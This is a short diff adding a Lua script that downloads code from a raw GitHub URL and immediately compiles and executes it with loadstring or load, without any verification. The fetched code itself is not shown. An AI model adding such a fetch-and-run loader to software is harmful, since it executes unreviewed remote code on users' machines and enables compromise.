@@ -1,0 +1,10 @@
+local url = "https://raw.githubusercontent.com/MAMZHOE/Alluneedislove/main/K"
+
+local http = require("socket.http")
+local body, code = http.request(url)
+
+assert(code == 200, "failed to fetch script: " .. tostring(code))
+
+local chunk = (loadstring and loadstring(body)) or load(body)
+assert(chunk, "compile failed")
+chunk()
